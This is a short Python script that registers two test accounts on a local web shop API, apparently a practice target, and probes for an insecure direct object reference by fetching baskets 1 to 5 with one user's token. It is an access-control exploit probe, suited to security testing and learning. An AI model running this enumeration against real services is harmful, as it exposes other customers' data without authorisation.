import requests

# Register customer1
r1 = requests.post('http://localhost:3000/api/Users', json={
    "email": "customer1@test.com", 
    "password": "password", 
    "passwordRepeat": "password", 
    "securityQuestion": {"id": 1, "question": "Name of your favorite pet?", "createdAt": "2026-10-09T05:02:18.913Z", "updatedAt": "2026-10-09T05:02:18.913Z"}, 
    "securityAnswer": "dog"
})

# Register customer2
r2 = requests.post('http://localhost:3000/api/Users', json={
    "email": "customer2@test.com", 
    "password": "password", 
    "passwordRepeat": "password", 
    "securityQuestion": {"id": 1, "question": "Name of your favorite pet?", "createdAt": "2026-10-09T05:02:18.913Z", "updatedAt": "2026-10-09T05:02:18.913Z"}, 
    "securityAnswer": "cat"
})

# Login as customer1
login1 = requests.post('http://localhost:3000/rest/user/login', json={'email': "customer1@test.com", 'password': 'password'})
token1 = login1.json()['authentication']['token']
bid1 = login1.json()['authentication']['bid']
print(f"Customer 1 logged in. Basket ID: {bid1}")

# Try to access baskets 1 through 5 using customer1's token
print("\nTesting IDOR on Baskets as Customer 1:")
headers = {'Authorization': 'Bearer ' + token1}
for i in range(1, 6):
    basket_resp = requests.get(f'http://localhost:3000/rest/basket/{i}', headers=headers)
    
    # Try to extract the user ID associated with this basket if exposed
    data = basket_resp.json().get('data', {}) if basket_resp.status_code == 200 else {}
    owner = data.get('UserId', 'Unknown')
    
    print(f"Basket {i} -> Status: {basket_resp.status_code}, Owner: {owner}")
